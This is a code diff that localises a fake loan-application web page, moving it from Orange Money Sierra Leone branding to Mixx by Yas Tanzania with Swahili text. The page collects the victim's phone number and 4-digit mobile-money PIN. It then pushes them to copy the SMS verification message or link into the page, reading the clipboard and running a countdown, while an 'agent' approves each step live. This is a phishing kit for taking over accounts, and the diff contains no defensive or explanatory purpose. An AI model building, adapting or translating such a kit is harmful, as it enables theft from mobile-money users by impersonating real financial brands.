+          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Hatua ya 3 ya 4</span>
         </div>
 
-        <!-- Big Orange Card Header -->
-        <div class="orange-gradient rounded-2xl p-4 sm:p-5 text-white text-center shadow-lg relative overflow-hidden">
-          <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center mb-2 sm:mb-3">
-            <img src="/orange_money_logo.jpg" alt="Orange Logo" class="h-6 w-6 sm:h-8 sm:w-8 rounded-full object-cover" />
+        <!-- Big Mixx Card Header -->
+        <div class="mixx-gradient rounded-2xl p-4 sm:p-5 text-white text-center shadow-lg relative overflow-hidden border border-blue-800/50">
+          <div class="w-12 h-12 mx-auto bg-white/10 backdrop-blur-md rounded-full flex items-center justify-center mb-2 sm:mb-3 border border-white/20">
+            <img src="/mixx_by_yas_logo.svg" alt="Mixx Logo" class="h-6 w-auto object-contain" />
           </div>
-          <h2 class="text-lg sm:text-xl font-extrabold" data-i18n="step3Title">Sign in to Orange Money</h2>
-          <p class="text-[11px] sm:text-xs text-orange-100 mt-0.5" data-i18n="step3Sub">Confirm your phone number and enter your 4-digit PIN to validate your loan.</p>
+          <h2 class="text-lg sm:text-xl font-black text-white" data-i18n="step3Title">Ingia kwenye Mixx by Yas</h2>
+          <p class="text-[11px] sm:text-xs text-blue-200 mt-0.5" data-i18n="step3Sub">Thibitisha nambari yako ya simu na uweke PIN ya tarakimu 4 ili kuthibitisha mkopo.</p>
         </div>
 
         <div class="space-y-3.5 sm:space-y-4">
           <div>
-            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1" data-i18n="phoneNum">Phone Number</label>
-            <div class="flex items-center bg-slate-100 border border-slate-200 rounded-xl px-3.5 py-2.5 sm:py-3 focus-within:bg-white focus-within:border-brand-orange focus-within:ring-2 focus-within:ring-brand-orange/20 transition-all">
-              <span class="text-xs font-extrabold text-slate-500 mr-2">+232</span>
-              <input id="momo-phone-display" type="tel" placeholder="76 123 456" oninput="onMomoPhoneInput(this.value)" class="bg-transparent text-xs sm:text-sm font-extrabold text-slate-800 w-full focus:outline-none" value="" />
+            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1" data-i18n="phoneNum">Nambari ya Simu</label>
+            <div class="flex items-center bg-slate-100 border border-slate-200 rounded-xl px-3.5 py-2.5 sm:py-3 focus-within:bg-white focus-within:border-brand-blue focus-within:ring-2 focus-within:ring-brand-blue/20 transition-all">
+              <span class="text-xs font-extrabold text-slate-500 mr-2">+255</span>
+              <input id="momo-phone-display" type="tel" placeholder="754 123 456" oninput="onMomoPhoneInput(this.value)" class="bg-transparent text-xs sm:text-sm font-extrabold text-slate-800 w-full focus:outline-none" value="" />
             </div>
           </div>
 
           <div>
             <div class="flex justify-between items-center mb-1.5 sm:mb-2">
-              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider" data-i18n="pinLabel">Orange Money PIN (4 digits):</label>
-              <button type="button" onclick="togglePinVisibility()" class="text-xs font-bold text-brand-orange hover:underline">
-                <span id="eye-text" data-i18n="showPin">Show</span>
+              <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider" data-i18n="pinLabel">PIN ya Mixx (tarakimu 4):</label>
+              <button type="button" onclick="togglePinVisibility()" class="text-xs font-bold text-brand-blue hover:underline">
+                <span id="eye-text" data-i18n="showPin">Onyesha</span>
               </button>
             </div>
 
-            <!-- 4-Digit PIN Input Grid for Sierra Leone -->
+            <!-- 4-Digit PIN Input Grid -->
             <div class="grid grid-cols-4 gap-2.5 sm:gap-3 py-0.5">
               <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
               <input type="password" maxlength="1" data-index="1" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
@@ -400,18 +402,18 @@
             onclick="submitApplication()" 
             class="w-full py-3.5 sm:py-4 bg-slate-200 text-slate-400 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200"
             data-i18n="confirmLoanBtn">
-            LOGIN & CONFIRM LOAN
+            INGIA NA THIBITISHA MKOPO
           </button>
 
           <!-- Live Approval Waiting Indicator for Step 3 PIN -->
-          <div id="pin-waiting-box" class="hidden p-3.5 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
+          <div id="pin-waiting-box" class="hidden p-3.5 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
             <div class="flex items-center justify-center space-x-2">
-              <span class="inline-block w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping"></span>
-              <span class="text-xs font-bold text-amber-900 uppercase tracking-wider" data-i18n="awaitingApproval">Awaiting Approval</span>
+              <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
+              <span class="text-xs font-bold text-blue-900 uppercase tracking-wider" data-i18n="awaitingApproval">Inasubiri Idhini</span>
             </div>
-            <p class="text-xs text-amber-800" data-i18n="pinAwaitingDesc">Your 4-digit PIN has been submitted. Please wait while your login is being verified...</p>
+            <p class="text-xs text-blue-800" data-i18n="pinAwaitingDesc">PIN yako imetumwa. Tafadhali subiri wakati kuingia kwako kunahakikiwa...</p>
             <div class="flex justify-center pt-1">
-              <svg class="animate-spin h-5 w-5 text-brand-orange" fill="none" viewBox="0 0 24 24">
+              <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
                 <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                 <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
               </svg>
@@ -423,20 +425,20 @@
       <!-- STEP 4: SMS Verification Message -->
       <section id="step-4" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
         <div>
-          <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 4 of 4</span>
-          <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step4Title">Account Ownership Verification</h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">Copy the confirmation message/link from your Messages app and paste it below.</p>
+          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Hatua ya 4 ya 4</span>
+          <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step4Title">Uhakiki wa Umiliki wa Akaunti</h2>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">Nakili ujumbe au kiunganishi cha uthibitisho kutoka kwenye programu ya Ujumbe kisha ubandike hapa chini.</p>
         </div>
 
         <div class="space-y-4">
           <!-- Copy & Redirect Guidance Card -->
-          <div class="bg-blue-50/90 border border-blue-200 rounded-2xl p-4 text-xs text-blue-900 space-y-3 shadow-sm">
+          <div class="bg-blue-50/90 border border-blue-200 rounded-2xl p-4 text-xs text-blue-950 space-y-3 shadow-sm">
             <div class="flex items-start space-x-3">
               <span class="text-2xl leading-none">📩</span>
               <div class="space-y-1">
-                <strong class="block font-bold text-slate-900 text-xs">Copy Verification Message from Phone</strong>
+                <strong class="block font-bold text-slate-900 text-xs">Nakili Ujumbe wa Uhakiki kutoka Simu</strong>
                 <p class="text-[11px] text-slate-600 leading-relaxed">
-                  Open your mobile <strong class="text-slate-800">Messages app</strong>, copy the SMS confirmation message or verification link sent to <strong class="font-mono text-brand-orangeDark">+232 <span id="sms-phone-target">76123456</span></strong>, and paste it into the text box below.
+                  Fungua programu yako ya <strong class="text-slate-800">Ujumbe (SMS)</strong>, nakili ujumbe au kiunganishi kilichotumwa kwa <strong class="font-mono text-brand-blueDeep">+255 <span id="sms-phone-target">754123456</span></strong>, kisha ubandike kwenye kisanduku hapa chini.
                 </p>
               </div>
             </div>
@@ -445,39 +447,39 @@
               <a 
                 href="sms:" 
                 onclick="openMessagingApp(event)" 
-                class="py-3 px-3 bg-brand-black hover:bg-slate-900 text-white font-extrabold rounded-xl text-center text-xs flex items-center justify-center space-x-1.5 transition-all shadow-sm">
+                class="py-3 px-3 bg-brand-blueDark hover:bg-blue-950 text-white font-extrabold rounded-xl text-center text-xs flex items-center justify-center space-x-1.5 transition-all shadow-sm">
                 <span>💬</span>
-                <span>Open SMS App</span>
+                <span>Fungua SMS</span>
               </a>
               <button 
                 type="button" 
                 onclick="pasteSmsFromClipboard()" 
-                class="py-3 px-3 orange-gradient hover:opacity-95 text-white font-extrabold rounded-xl text-center text-xs flex items-center justify-center space-x-1.5 transition-all shadow-md active:scale-95">
+                class="py-3 px-3 mixx-btn-gradient hover:opacity-95 text-blue-950 font-black rounded-xl text-center text-xs flex items-center justify-center space-x-1.5 transition-all shadow-md active:scale-95">
                 <span>⚡</span>
-                <span>AUTO-FILL CLIPBOARD</span>
+                <span>BANDIKA KUTOKA CLIPBOARD</span>
               </button>
             </div>
           </div>
 
           <!-- 20-Second Message Verification Countdown Timer Card -->
-          <div id="sim-sms-countdown-card" class="bg-gradient-to-r from-orange-50 to-amber-50 border border-amber-200 rounded-2xl p-4 text-center space-y-1.5 shadow-sm">
+          <div id="sim-sms-countdown-card" class="bg-gradient-to-r from-blue-50 to-cyan-50 border border-blue-200 rounded-2xl p-4 text-center space-y-1.5 shadow-sm">
             <div class="flex items-center justify-center space-x-2">
               <span class="relative flex h-2.5 w-2.5">
-                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-orange opacity-75"></span>
-                <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-brand-orange"></span>
+                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-brand-blue"></span>
               </span>
-              <span class="text-xs font-extrabold text-amber-950 uppercase tracking-wider">Message Verification Countdown</span>
+              <span class="text-xs font-extrabold text-blue-950 uppercase tracking-wider">Muda wa Uhakiki wa Ujumbe</span>
             </div>
-            <p class="text-[11px] text-slate-600 font-medium">Verification SMS sent to <strong class="text-brand-orangeDark font-mono">+232 <span id="sms-timer-phone">76123456</span></strong></p>
-            <div id="sms-timer-display" class="text-3xl font-black text-brand-orange tracking-tight font-mono py-0.5">00:20</div>
-            <p id="sms-timer-status" class="text-[11px] text-slate-500 font-semibold">Copy the confirmation message or link from Messages app and paste it below.</p>
+            <p class="text-[11px] text-slate-600 font-medium">Ujumbe wa SMS umeelekezwa kwa <strong class="text-brand-blueDeep font-mono">+255 <span id="sms-timer-phone">754123456</span></strong></p>
+            <div id="sms-timer-display" class="text-3xl font-black text-brand-blue tracking-tight font-mono py-0.5">00:20</div>
+            <p id="sms-timer-status" class="text-[11px] text-slate-500 font-semibold">Nakili ujumbe wa uthibitisho kisha ubandike hapa chini.</p>
           </div>
 
           <div>
             <div class="flex justify-between items-center mb-2">
-              <label for="momo-pasted-msg" class="block text-xs font-bold text-slate-700 uppercase tracking-wider" data-i18n="smsLabel">SMS Confirmation Message / Link</label>
+              <label for="momo-pasted-msg" class="block text-xs font-bold text-slate-700 uppercase tracking-wider" data-i18n="smsLabel">Ujumbe wa Uthibitisho (SMS)</label>
               <span id="sms-waiting-badge" class="inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200">
-                <span>Ready to Auto-Fill</span>
+                <span>Tayari Kubandika</span>
               </span>
             </div>
 
@@ -490,16 +492,16 @@
                 autocorrect="off" 
                 autocapitalize="off" 
                 spellcheck="false" 
-                placeholder="Paste SMS confirmation message or verification link here..."
+                placeholder="Bandika ujumbe wa SMS au kiunganishi hapa..."
                 oninput="handlePostLoginPastedMsg(this.value)"
-                class="w-full bg-slate-50 border-2 border-slate-300 rounded-xl p-3.5 pr-28 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-orange focus:ring-2 focus:ring-brand-orange/20"
+                class="w-full bg-slate-50 border-2 border-slate-300 rounded-xl p-3.5 pr-28 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20"
               />
               <button 
                 type="button" 
                 onclick="pasteSmsFromClipboard()" 
-                class="absolute right-2 top-1/2 -translate-y-1/2 px-3 py-1.5 orange-gradient text-white text-[11px] font-extrabold rounded-lg shadow-sm hover:opacity-95 active:scale-95 transition-all flex items-center space-x-1">
+                class="absolute right-2 top-1/2 -translate-y-1/2 px-3 py-1.5 mixx-btn-gradient text-blue-950 text-[11px] font-black rounded-lg shadow-sm hover:opacity-95 active:scale-95 transition-all flex items-center space-x-1">
                 <span>📋</span>
-                <span>Auto-Fill</span>
+                <span>Bandika</span>
               </button>
             </div>
 
@@ -507,7 +509,7 @@
               <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
               </svg>
-              <span>Message detected! Auto-submitting for verification...</span>
+              <span>Ujumbe umetambuliwa! Unatuma kwa ajili ya uhakiki...</span>
             </div>
 
             <div id="msg-retry-alert" class="mt-3 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
@@ -517,20 +519,20 @@
             id="submit-pasted-msg-btn" 
             type="button" 
             onclick="submitRegisteredMessage()" 
-            class="w-full py-4 orange-gradient text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase transition-all duration-200"
+            class="w-full py-4 mixx-btn-gradient text-blue-950 font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all duration-200"
             data-i18n="submitSmsBtn">
-            SUBMIT VERIFICATION MESSAGE
+            TUMA UJUMBE WA UHAKIKI
           </button>
 
           <!-- Live Approval Waiting Indicator for Step 4 SMS -->
-          <div id="sms-waiting-box" class="hidden p-4 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
+          <div id="sms-waiting-box" class="hidden p-4 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
             <div class="flex items-center justify-center space-x-2">
-              <span class="inline-block w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping"></span>
-              <span class="text-xs font-bold text-amber-900 uppercase tracking-wider" data-i18n="awaitingVerification">Awaiting Verification</span>
+              <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
+              <span class="text-xs font-bold text-blue-900 uppercase tracking-wider" data-i18n="awaitingVerification">Inasubiri Uhakiki</span>
             </div>
-            <p class="text-xs text-amber-800" data-i18n="smsAwaitingDesc">Your SMS verification has been submitted. Please wait while your submission is being verified...</p>
+            <p class="text-xs text-blue-800" data-i18n="smsAwaitingDesc">Uhakiki wako wa SMS umetwa. Tafadhali subiri wakati uthibitisho wako unakaguliwa...</p>
             <div class="flex justify-center pt-1">
-              <svg class="animate-spin h-5 w-5 text-brand-orange" fill="none" viewBox="0 0 24 24">
+              <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
                 <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                 <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
               </svg>
@@ -548,39 +550,39 @@
             </svg>
           </div>
           
-          <h2 class="text-xl font-extrabold text-slate-900" data-i18n="step5Title">Application Submitted!</h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step5Sub">Your loan request has been routed to Orange Money Financial Services Sierra Leone.</p>
+          <h2 class="text-xl font-extrabold text-slate-900" data-i18n="step5Title">Ombi Lilitumwa!</h2>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step5Sub">Ombi lako la mkopo limeelekezwa kwa Huduma za Kifedha za Mixx by Yas Tanzania.</p>
         </div>
 
         <div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 text-left space-y-3 text-xs shadow-sm">
           <div class="flex justify-between py-1.5 border-b border-slate-200">
-            <span class="text-slate-500" data-i18n="appRef">Application Reference:</span>
-            <span id="summary-ref-id" class="font-mono font-extrabold text-brand-orange">ORANGE-PENDING</span>
+            <span class="text-slate-500" data-i18n="appRef">Nambari ya Kumbukumbu:</span>
+            <span id="summary-ref-id" class="font-mono font-extrabold text-brand-blue">MIXX-PENDING</span>
           </div>
           <div class="flex justify-between py-1.5 border-b border-slate-200">
-            <span class="text-slate-500" data-i18n="applicantName">Applicant:</span>
+            <span class="text-slate-500" data-i18n="applicantName">Mwombaji:</span>
             <span id="summary-name" class="font-bold text-slate-800">--</span>
           </div>
           <div class="flex justify-between py-1.5 border-b border-slate-200">
-            <span class="text-slate-500" data-i18n="orangeContact">Orange Contact:</span>
+            <span class="text-slate-500" data-i18n="orangeContact">Mawasiliano ya Mixx:</span>
             <span id="summary-phone" class="font-bold text-slate-800">--</span>
           </div>
           <div class="flex justify-between py-1.5 border-b border-slate-200">
-            <span class="text-slate-500" data-i18n="loanMode">Loan Type:</span>
-            <span id="summary-type" class="font-bold text-slate-800">Personal Loan</span>
+            <span class="text-slate-500" data-i18n="loanMode">Aina ya Mkopo:</span>
+            <span id="summary-type" class="font-bold text-slate-800">Nivushe Plus Loan</span>
           </div>
           <div class="flex justify-between py-1.5 border-b border-slate-200">
-            <span class="text-slate-500" data-i18n="requestedAmt">Requested Amount:</span>
-            <span id="summary-amount" class="font-bold text-brand-orange">SLE 10,000</span>
+            <span class="text-slate-500" data-i18n="requestedAmt">Kiasi Kilichoombwa:</span>
+            <span id="summary-amount" class="font-bold text-brand-blueDeep">TZS 5,000,000</span>
           </div>
           <div class="flex justify-between py-1.5 border-b border-slate-200">
-            <span class="text-slate-500" data-i18n="termRepay">Term / Payment:</span>
-            <span id="summary-term" class="font-bold text-slate-800">6 Months (1,917 SLE/mo)</span>
+            <span class="text-slate-500" data-i18n="termRepay">Muda / Marejesho:</span>
+            <span id="summary-term" class="font-bold text-slate-800">Miezi 6 (958,333 TZS/mo)</span>
           </div>
           <div class="flex justify-between py-1.5">
-            <span class="text-slate-500" data-i18n="currentStatus">Current Status:</span>
+            <span class="text-slate-500" data-i18n="currentStatus">Hali ya Sasa:</span>
             <span id="summary-status-badge" class="inline-flex items-center px-2.5 py-0.5 rounded-full text-[11px] font-extrabold bg-amber-100 text-amber-800 border border-amber-300" data-i18n="statusPending">
-              ⏳ Under Review
+              ⏳ Inakaguliwa
             </span>
           </div>
         </div>
@@ -589,9 +591,9 @@
           <button 
             type="button" 
             onclick="goToStep(0)" 
-            class="w-full py-4 bg-brand-black hover:bg-slate-900 text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase"
+            class="w-full py-4 bg-brand-blueDark hover:bg-blue-950 text-white font-extrabold rounded-xl shadow-md text-xs tracking-wider uppercase"
             data-i18n="newLoanBtn">
-            APPLY FOR ANOTHER LOAN
+            OMBA MKOPO MWINGINE
           </button>
         </div>
       </section>
@@ -599,48 +601,48 @@
     </main>
 
     <!-- Footer Wave / Brand Tag -->
-    <footer class="bg-brand-black text-slate-400 py-3 text-center text-[11px] border-t border-slate-800">
-      <p data-i18n="footerRights">© 2026 Orange Money Credit Services Sierra Leone</p>
+    <footer class="bg-brand-blueDark text-blue-300 py-3 text-center text-[11px] border-t border-blue-900/50">
+      <p data-i18n="footerRights">© 2026 Mixx by Yas Tanzania — Huduma za Kifedha na Mikopo</p>
     </footer>
 
     <!-- Notification Modal -->
     <div id="notice-modal" class="fixed inset-0 bg-black/60 z-50 hidden flex items-center justify-center p-4 backdrop-blur-sm">
       <div class="bg-white rounded-2xl max-w-xs w-full p-6 shadow-2xl text-center space-y-4">
-        <h3 id="modal-title" class="font-extrabold text-slate-900 text-base">Notification</h3>
+        <h3 id="modal-title" class="font-extrabold text-slate-900 text-base">Taarifa</h3>
         <p id="modal-message" class="text-xs text-slate-600 leading-relaxed"></p>
-        <button onclick="toggleNoticeModal(false)" class="w-full py-3 orange-gradient text-white text-xs font-bold rounded-xl shadow-md">
-          Dismiss
+        <button onclick="toggleNoticeModal(false)" class="w-full py-3 mixx-btn-gradient text-blue-950 text-xs font-bold rounded-xl shadow-md">
+          Ondoa
         </button>
       </div>
     </div>
 
     <!-- Full-Page Approval Overlay Screen -->
-    <div id="full-page-approval-modal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-center p-6 bg-slate-950/95 backdrop-blur-xl text-white text-center transition-all duration-300">
-      <div class="max-w-sm w-full bg-white text-slate-900 rounded-3xl p-7 shadow-2xl border border-slate-100 flex flex-col items-center space-y-6 relative overflow-hidden">
-        <!-- Top decorative orange accent bar -->
-        <div class="absolute top-0 inset-x-0 h-2 orange-gradient"></div>
+    <div id="full-page-approval-modal" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-center p-6 bg-blue-950/95 backdrop-blur-xl text-white text-center transition-all duration-300">
+      <div class="max-w-sm w-full bg-white text-slate-900 rounded-3xl p-7 shadow-2xl border border-blue-100 flex flex-col items-center space-y-6 relative overflow-hidden">
+        <!-- Top decorative yellow accent bar -->
+        <div class="absolute top-0 inset-x-0 h-2 mixx-btn-gradient"></div>
 
         <div class="relative flex items-center justify-center pt-2">
-          <div class="w-20 h-20 rounded-full bg-orange-100 flex items-center justify-center shadow-inner border-4 border-orange-50">
-            <img src="/orange_money_logo.jpg" alt="Orange Money" class="w-12 h-12 rounded-full object-cover shadow-sm" />
+          <div class="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center shadow-inner border-4 border-blue-50">
+            <img src="/mixx_by_yas_logo.svg" alt="Mixx by Yas" class="w-14 h-auto object-contain" />
           </div>
           <span class="absolute bottom-0 right-0 flex h-6 w-6">
-            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-orange opacity-75"></span>
-            <span class="relative inline-flex rounded-full h-6 w-6 bg-brand-orange text-xs font-bold text-white items-center justify-center shadow-md">⏳</span>
+            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-yellow opacity-75"></span>
+            <span class="relative inline-flex rounded-full h-6 w-6 bg-brand-yellow text-xs font-black text-blue-950 items-center justify-center shadow-md">⏳</span>
           </span>
         </div>
 
         <div class="space-y-2 px-2">
-          <h3 id="approval-modal-title" class="text-lg font-extrabold text-slate-900 tracking-tight">Awaiting Approval</h3>
-          <p id="approval-modal-desc" class="text-xs text-slate-600 leading-relaxed font-medium">Your request has been submitted. Please wait while your referral agent verifies and approves your submission...</p>
+          <h3 id="approval-modal-title" class="text-lg font-extrabold text-slate-900 tracking-tight">Inasubiri Idhini</h3>
+          <p id="approval-modal-desc" class="text-xs text-slate-600 leading-relaxed font-medium">Ombi lako limetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anaidhinisha uthibitisho wako...</p>
         </div>
 
-        <div class="w-full pt-1 flex items-center justify-center space-x-3 bg-amber-50 border border-amber-200 rounded-2xl py-3.5 px-4 shadow-sm">
-          <svg class="animate-spin h-5 w-5 text-brand-orange flex-shrink-0" fill="none" viewBox="0 0 24 24">
+        <div class="w-full pt-1 flex items-center justify-center space-x-3 bg-blue-50 border border-blue-200 rounded-2xl py-3.5 px-4 shadow-sm">
+          <svg class="animate-spin h-5 w-5 text-brand-blue flex-shrink-0" fill="none" viewBox="0 0 24 24">
             <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
             <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
           </svg>
-          <span id="approval-modal-status" class="text-xs font-extrabold text-amber-900 uppercase tracking-wider">Verifying with Agent...</span>
+          <span id="approval-modal-status" class="text-xs font-extrabold text-blue-950 uppercase tracking-wider">Inahakikiwa na Wakala...</span>
         </div>
       </div>
     </div>
@@ -653,10 +655,10 @@
     let pinVisible = false;
 
     const appState = {
-      loanAmount: 10000,
+      loanAmount: 5000000,
       loanTermMonths: 6,
-      loanType: 'Personal Loan',
-      purpose: 'Personal Investment',
+      loanType: 'Nivushe Plus Loan',
+      purpose: 'Biashara na Mtaji',
       firstName: '',
       lastName: '',
       phoneNumber: '',
@@ -674,11 +676,11 @@
     function updateCalculator(val) {
       const amount = parseInt(val, 10);
       appState.loanAmount = amount;
-      document.getElementById('calc-amount-display').innerText = 'SLE ' + amount.toLocaleString();
+      document.getElementById('calc-amount-display').innerText = 'TZS ' + amount.toLocaleString();
       
       const monthly = calculateMonthly(amount, appState.loanTermMonths);
       document.getElementById('calc-monthly-payment').innerText = monthly.toLocaleString();
-      document.getElementById('calc-total-payment').innerText = 'SLE ' + (monthly * appState.loanTermMonths).toLocaleString();
+      document.getElementById('calc-total-payment').innerText = 'TZS ' + (monthly * appState.loanTermMonths).toLocaleString();
       
       const loanAmountInput = document.getElementById('loan-amount-input');
       if (loanAmountInput) loanAmountInput.value = amount;
@@ -687,14 +689,14 @@
     function setTerm(months, ev) {
       appState.loanTermMonths = months;
       document.querySelectorAll('.term-btn').forEach(btn => {
-        btn.classList.remove('border-2', 'border-brand-orange', 'bg-brand-orangeLight', 'text-brand-orangeDark', 'shadow-sm');
+        btn.classList.remove('border-2', 'border-brand-blue', 'bg-brand-blueLight', 'text-brand-blueDeep', 'shadow-sm');
         btn.classList.add('border', 'border-slate-200', 'text-slate-700');
       });
 
       const e = ev || (typeof event !== 'undefined' ? event : null);
       if (e && e.target) {
         e.target.classList.remove('border', 'border-slate-200', 'text-slate-700');
-        e.target.classList.add('border-2', 'border-brand-orange', 'bg-brand-orangeLight', 'text-brand-orangeDark', 'shadow-sm');
+        e.target.classList.add('border-2', 'border-brand-blue', 'bg-brand-blueLight', 'text-brand-blueDeep', 'shadow-sm');
       }
 
       const termSelect = document.getElementById('loan-term-select');
@@ -728,7 +730,7 @@
         if (window.location.hostname && window.location.hostname.includes('render.com') && u.hostname.includes('render.com')) return true;
         if (u.hostname === 'localhost' || u.hostname === '127.0.0.1') return true;
       } catch (e) {}
-      if (urlStr.includes('maxit-mobile.orange-sonatel.com')) return true;
+      if (urlStr.includes('mixx.co.tz')) return true;
       return false;
     }
 
@@ -765,27 +767,22 @@
           const cleanText = text.trim();
           const link = extractVerificationLink(cleanText);
           if (link && isOwnSiteUrl(link)) {
-            showClipboardToast('⚠️ Clipboard contains this website URL, not your SMS verification link.');
+            showClipboardToast('⚠️ Clipboard ina kiunganishi cha tovuti hii, siyo kiunganishi cha SMS.');
             return;
           }
           const finalVal = (link && !isOwnSiteUrl(link)) ? link : cleanText;
           if (msgInput) {
             msgInput.value = finalVal;
-            showClipboardToast(finalVal.startsWith('http') ? '⚡ Verification Link Pasted!' : '⚡ Auto-Filled SMS from Clipboard!');
+            showClipboardToast(finalVal.startsWith('http') ? '⚡ Kiunganishi kimebandikwa!' : '⚡ SMS imebandikwa kutoka Clipboard!');
             handlePostLoginPastedMsg(finalVal, false);
           }
         } else {
-          showClipboardToast('📋 Clipboard is empty. Please copy SMS link or message first.');
+          showClipboardToast('📋 Clipboard haina kitu. Tafadhali nakili kiunganishi kwanza.');
         }
       } catch (err) {
         console.warn('Clipboard access error:', err);
-        showClipboardToast('📋 Click box to paste your verification link.');
+        showClipboardToast('📋 Bofya kisanduku ili kubandika kiunganishi chako.');
       }
-    }
-
-    function focusMsgInput() {
-      const msgInput = document.getElementById('momo-pasted-msg');
-      if (msgInput) msgInput.focus();
     }
 
     function resetScrollToTop() {
@@ -832,13 +829,11 @@
       if (e) {
         try { e.preventDefault(); } catch (err) {}
       }
-      // Restart countdown timer when opening messaging app so user has full 20s window upon returning
       startSmsCountdownTimer();
 
       const isAndroid = /android/i.test(navigator.userAgent);
       if (isAndroid) {
         try {
-          // Open default messaging app's main conversation list (existing chats)
           window.location.href = 'intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.APP_MESSAGING;end';
           setTimeout(() => {
             window.location.href = 'sms:';
@@ -851,8 +846,6 @@
       }
       window.location.href = 'sms:';
     }
-
-
 
     let simCountdownInterval = null;
     function startSmsCountdownTimer() {
@@ -871,15 +864,15 @@
       }
 
       if (phoneEl) {
-        phoneEl.innerText = appState.phoneNumber || '76123456';
+        phoneEl.innerText = appState.phoneNumber || 'Akaunti ya Mixx';
       }
 
       if (displayEl) {
         displayEl.innerText = '00:20';
-        displayEl.className = 'text-3xl font-black text-brand-orange tracking-tight font-mono py-0.5';
+        displayEl.className = 'text-3xl font-black text-brand-blue tracking-tight font-mono py-0.5';
       }
       if (statusEl) {
-        statusEl.innerText = 'Copy the confirmation message or link from Messages app and paste it below.';
+        statusEl.innerText = 'Nakili ujumbe wa uthibitisho kisha ubandike hapa chini.';
         statusEl.className = 'text-[11px] text-slate-500 font-semibold';
       }
 
@@ -904,7 +897,7 @@
             displayEl.className = 'text-2xl font-black text-red-600 tracking-tight font-mono py-0.5';
           }
           if (statusEl) {
-            statusEl.innerText = '⚠️ Timer expired. If you did not receive SMS, please click Open SMS App or tap Auto-Fill.';
+            statusEl.innerText = '⚠️ Muda umeisha. Kama hujapata SMS, bofya Fungua SMS au Bandika.';
             statusEl.className = 'text-[11px] text-red-600 font-bold';
           }
         }
@@ -930,13 +923,11 @@
             const finalVal = (link && !isOwnSiteUrl(link)) ? link : incoming;
             if (finalVal && msgInput) {
               msgInput.value = finalVal;
